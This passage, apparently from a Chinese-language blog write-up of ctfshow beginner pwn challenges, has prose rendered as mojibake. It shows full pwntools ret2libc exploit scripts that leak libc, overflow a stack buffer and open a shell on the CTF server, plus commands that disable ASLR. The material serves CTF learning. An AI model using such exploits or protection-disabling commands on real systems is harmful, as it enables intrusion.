</span></span><span class="line"><span class="cl"><span class="c1"># 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºsystemå‡½æ•°åœ°å€ï¼ˆè°ƒç”¨systemæ‰§è¡Œå‘½ä»¤ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. systemæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå¯é€‰ï¼Œä¸å½±å“shellä½¿ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. systemå‡½æ•°çš„å‚æ•°ï¼š&#34;/bin/sh&#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆæ‰§è¡Œè¯¥å‘½ä»¤è·å–äº¤äº’shellï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬äºŒæ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œsystem(&#34;/bin/sh&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–çš„shellè¿›è¡Œäº¤äº’ï¼ˆè¾“å…¥å‘½ä»¤ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŸç‰ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28157</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™éƒ¨åˆ†ä¸»è¦æ¶‰åŠåˆ°æ ˆæº¢å‡ºçš„ç« èŠ‚çŸ¥è¯†ç‚¹ï¼Œæˆ‘å·²ç»è®²è§£çš„å¾ˆè¯¦ç»†å¾ˆå•°å—¦äº†ï¼Œå¦‚æœçœ‹ä¸æ‡‚å°±è·³è¿‡å§ï¼ŒæŠŠæ ˆæº¢å‡ºææ‡‚åå†è·³å›æ¥åšã€‚æˆ‘å½“æ—¶ä¹Ÿæ˜¯è·³è¿‡çš„ï¼Œä¹‹åå†å›æ¥å†™wpçš„ã€‚</p>
<p>æ„Ÿè§‰å¼ºåº¦ä¸Šæ¥äº†ï¼Œåšå¾—æœ‰ç‚¹åƒåŠ›ã€‚</p>
<h3 id="pwn_026">PWN_026
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚ä¸ºç¡®ä¿flagæ­£ç¡®ï¼Œæœ¬é¢˜å»ºè®®ç”¨æä¾›è™šæ‹Ÿæœºè¿è¡Œã€‚  <a class="link" href="PWN_26%5cPWN" >PWN</a>  <a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a> ï¼ˆæå–ç showï¼‰</p>
<p>è¿™é¢˜å‘åˆ°æˆ‘äº†ï¼Œè¿è¡Œç¨‹åºå‘ç°ç›´æ¥çˆ†flagï¼Œäº¤ä¸Šå»å‘ç°æ˜¯å‡çš„/(ã„’oã„’)/~~</p>
<p>IDAx64åˆ†æï¼Œæœ‰systemåé—¨å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70.png"
	width="1195"
	height="590"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70_hu_5af04d0f0913cda9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70_hu_4cf51b4305482ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="486px"
	
></p>
<p>è€Œä¸”å¯ä»¥çŸ¥é“è¿™ä¸ªflagæ˜¯æœ‰å‡ ä¸ªprintfã€putså…±åŒæ‰“å°å‡ºçš„ã€å­—ç¬¦ä¸²ç”±åœ°å€æ‹¼æ¥ï¼ˆ%pæ‰“å°æŒ‡é’ˆæˆ–è€…åœ°å€ï¼Œä»¥16è¿›åˆ¶å½¢å¼ï¼‰è€Œæˆã€‚</p>
<p>è¿è¡Œä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71.png"
	width="1250"
	height="719"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71_hu_e57bc28849d3c88.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71_hu_1586fa3609ae168d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="417px"
	
></p>
<p>æ¯æ¬¡flagéƒ½ä¸ä¸€æ ·ï¼Œè¯´æ˜åœ°å€ä¸€ç›´åœ¨å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ°å€éšæœºåŒ–ã€‚</p>
<p>åœ¨Linuxä¿æŠ¤æœºåˆ¶æœ‰è®²è¿‡ASLRï¼Œå…³äº<a class="link" href="http://localhost:1313/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLRä¿æŠ¤å¯ä»¥çœ‹å›PWN-1</a>ï¼šASLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿçº§åˆ«çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨å¢åŠ è½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å®ƒé€šè¿‡éšæœºåŒ–ç¨‹åºåœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥å‡†ç¡®åœ°ç¡®å®šå…³é”®ä»£ç å’Œæ•°æ®çš„ä½ç½®ã€‚</p>
<p>gdbè°ƒè¯•ä¸€ä¸‹ï¼Œé¢˜ç›®æ—©ç»™å‡ºäº†2ï¼Œåœ¨è¿™é‡Œå•çº¯æ¼”ç¤ºä¸€ä¸‹ï¼›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb -q pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72.png"
	width="1110"
	height="410"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72_hu_f7e2f4bac4aac2dd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72_hu_1517f77077b3d7c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell cat /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div><p>è™½ç„¶ <code>checksec</code> è¾“å‡ºä¸­æ²¡æœ‰ç›´æ¥çš„ ASLR å¼€å¯çŠ¶æ€ï¼Œä½†å¯ä»¥ç»“åˆç³»ç»Ÿå±‚é¢çš„è®¾ç½®ï¼ˆé€šè¿‡ <code>cat/proc/sys/kernel/randomize_va_space</code> æŸ¥çœ‹ï¼Œè¾“å‡º <code>0</code> è¡¨ç¤ºå…³é—­ ASLRï¼Œ<code>1</code> è¡¨ç¤ºéƒ¨åˆ†å¼€å¯ï¼Œ<code>2</code> è¡¨ç¤ºå®Œå…¨å¼€å¯ ï¼‰æ¥åˆ¤æ–­ç¨‹åºè¿è¡Œæ—¶çš„ ASLR æƒ…å†µã€‚</p>
<p>æ—¢ç„¶åœ°å€éšæœºåŒ–ä¿æŠ¤ï¼Œæˆ‘ä»¬å°±æŠŠå®ƒå…³æ‰ï¼ˆè®°å¾—ææƒrootï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73.png"
	width="1340"
	height="774"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73_hu_b96db4a3f2e41298.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73_hu_5ee4a282ddb01af4.png 1024w"
	loading="lazy"
	
		alt="flag"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="415px"
	
></p>
<p>è¿™é‡Œæœ‰ä¸ªç‚¹å°±æ˜¯æˆ‘çš„flagæ˜¯ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}</p>
<p>ä½†ä¸çŸ¥ä¸ºå•¥å’Œå®˜æ–¹ä¸ä¸€æ ·flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
<p>ä½†æˆ‘çš„ç¨‹åºè¿è¡Œäº†ä¸‰æ¬¡ï¼ŒASRLä¹Ÿå…³äº†ï¼Œflagå‡ºæ¥çš„æ˜¯ä¸€æ ·çš„ï¼Œä»£è¡¨åœ°å€æ˜¯çœŸå®çš„ï¼Œflagæ²¡é”™çš„ã€‚åæ­£å¤§ä½“æ€è·¯æ˜¯æ­£ç¡®çš„ã€‚</p>
<blockquote class="alert alert-tip">
    <p>æ€»ä¹‹è®°ä½ï¼š/proc/sys/kernel/randomize_va_space</p></blockquote>
<h3 id="pwn_027">PWN_027
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>   <a class="link" href="PWN_027%5cPWN" >PWN</a></p>
<p>è¿™é¢˜ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œâ€If the result is 0 or 1, then you get the correct flag!â€œå°†ASLRä¿æŠ¤çš„æ•°å€¼æ”¹æˆ1æˆ–0å°±å¥½ã€‚ï¼ˆå¥—ä¸Šé¢˜çš„å…¬å¼ï¼‰</p>
<p>æ€ªæ€ªçš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74.png"
	width="579"
	height="161"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74_hu_a5de9c2fc5414abb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74_hu_32320de88db9a594.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="863px"
	
></p>
<p>å®˜æ–¹flagæ˜¯ctfshow{0x400687_0x400560_0x603260}</p>
<p>æ¬¸æˆ‘å‘ç°&hellip;.0x603260çš„åé¢çš„6å˜æˆaäº†ï¼Œæœ‰ç‚¹æ‹›ç¬‘&hellip;åº”è¯¥æ˜¯Kaliç¯å¢ƒå’ŒUbuntuä¸åŒï¼Œæˆ‘å»ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå‘ç°å¤§éƒ¨åˆ†PWNçš„WPéƒ½æ˜¯ç”¨Ubuntuè§£çš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75.png"
	width="1203"
	height="595"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75_hu_d19abb44e81b7200.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75_hu_da8dd3cdf4dd0a83.png 1024w"
	loading="lazy"
	
		alt="Ubuntu"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>è¿™é‡Œçš„flagå°±æ˜¯æ­£å¸¸çš„äº†ã€‚ä»ç°åœ¨å¼€å§‹æˆ‘å°†å½»åº•ä½¿ç”¨Ubuntuäº†ã€‚</p>
<h3 id="pwn_028">PWN_028
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagï¼›<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>ã€ <a class="link" href="PWN_028%5cPWN" >PWN</a> ï¼ˆshowï¼‰</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76.png"
	width="1081"
	height="520"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76_hu_3bb0ae8eea6f69ee.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76_hu_bd87ab6076c16d6.png 1024w"
	loading="lazy"
	
		alt="é€åˆ†"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>è¿™é¢˜é€åˆ†çš„ï¼ŒASLRç›´æ¥å…³çš„ï¼Œflagè¿˜æ˜¯åœ°å€æ‹¼å‡ºæ¥çš„ï¼Œé‚£flagå°±ä¸å˜å¾—å°±æ˜¯çœŸçš„äº†ã€‚ä¸ä¿¡å¯ä»¥å¤šè¿è¡Œå‡ æ¬¡ï¼Œä½ çœ‹flagä¼šå˜å—ï¼Ÿ</p>
<p>flag is :ctfshow{0x400687_0x400560}</p>
<h3 id="pwn_029">PWN_029
</h3><p>é¢˜ç›®ï¼šASLRå’ŒPIEå¼€å¯åï¼›<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>ã€ <a class="link" href="PWN_029%5cPWN" >PWN</a></p>
<p>è¯•ç€<a class="link" href="https://expl0rer.top/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLRå’ŒPIEä¿æŠ¤</a>å¼€å¯åï¼Œåœ°å€éƒ½ä¼šå°†éšæœºåŒ–ï¼Œè¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç²’åº¦é—®é¢˜ï¼Œè™½ç„¶åœ°å€éƒ½è¢«éšæœºåŒ–äº†ï¼Œä½†æ˜¯è¢«éšæœºåŒ–çš„éƒ½ä»…ä»…æ˜¯æŸä¸ªå¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œè€Œåœ¨å…¶å†…éƒ¨è¿˜æ˜¯åŸæ¥çš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹åç§»æ˜¯ä¸ä¼šå˜åŒ–çš„ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80.png"
	width="1045"
	height="210"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80_hu_eb0b3f7225c19224.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80_hu_a72e66fce323c049.png 1024w"
	loading="lazy"
	
		alt="å·²ç»å¼€äº†PIEä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="497"
		data-flex-basis="1194px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sysctl -w kernel.randomize_va_space<span class="o">=</span><span class="m">2</span>  <span class="c1">#å®Œå…¨æ‰“å¼€ASLRä¿æŠ¤</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥è¿è¡Œ&hellip;&hellip;</p>
<p>flagï¼ˆæœ‰ç‚¹é•¿ä½†æ˜¯å¯¹çš„&hellip;ï¼‰ï¼šctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}</p>
<p>è¿™é¢˜åªæ˜¯è®©ä½ äº†è§£ä¸‹ASLRå’ŒPIEä¿æŠ¤çš„ç‰¹ç‚¹ï¼Œflagä¸æ˜¯ç›®çš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77.png"
	width="721"
	height="246"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77_hu_786e1172cf75d668.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77_hu_6905a90a7330f54a.png 1024w"
	loading="lazy"
	
		alt="1"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="703px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78.png"
	width="939"
	height="306"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78_hu_e1703259702046b2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78_hu_f1640231a6bba9a3.png 1024w"
	loading="lazy"
	
		alt="2"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="736px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79.png"
	width="851"
	height="331"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79_hu_fec9c38c099bb243.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79_hu_e3e1050063b8af4d.png 1024w"
	loading="lazy"
	
		alt="3"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<h3 id="pwn_030">PWN_030
</h3><p>é¢˜ç›®ï¼šå…³é—­PIEåï¼›ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚</p>
<p>checksecä¸€ä¸‹ï¼šæ²¡å¼€canaryå’ŒPIEï¼Œå¼€äº†NXä¸å¥½ç”¨Shellcodeã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81.png"
	width="1219"
	height="630"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81_hu_890da67cf56d99a7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81_hu_931c9c7556ed7bb5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>IDAx32çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82.png"
	width="690"
	height="215"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82_hu_598aa473ae731e26.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82_hu_8f000c14f3a5fcb4.png 1024w"
	loading="lazy"
	
		alt="æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="770px"
	
></p>
<p>buf ï¼Œç”¨äºå­˜å‚¨ä»æ ‡å‡†è¾“å…¥è¯»å–çš„æ•°æ®ã€‚è¯¥å˜é‡åœ¨æ ˆä¸Šåˆ†é…ï¼Œç›¸å¯¹äºå‡½æ•°æ ˆå¸§æŒ‡é’ˆ ebp çš„åç§»ä¸º-0x88 ã€‚è°ƒç”¨ read å‡½æ•°ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚ read å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™é‡Œä½¿ç”¨ 0 è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘å­˜å‚¨æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯ &amp;buf ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œè¿™é‡Œæ˜¯ 0x100u ï¼Œå³ 256 å­—èŠ‚ï¼Œä½†è¿™charå®šä¹‰bufæ˜¯132å­—èŠ‚ï¼Œæ‰€ä»¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>å¹¶æ— æ‰¾åˆ°åé—¨/bin/shï¼Œé€šè¿‡ret2libcï¼Œé‚£ä»æ ˆæº¢å‡ºä¸‹æ‰‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†è°ƒè¯•ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>       <span class="c1"># æŒ‡å®šç›®æ ‡ç¨‹åºä¸º32ä½æ¶æ„</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡å™¨ï¼Œè‹¥æœ¬åœ°è°ƒè¯•å¯åˆ‡æ¢ä¸ºprocess</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28121</span><span class="p">)</span>
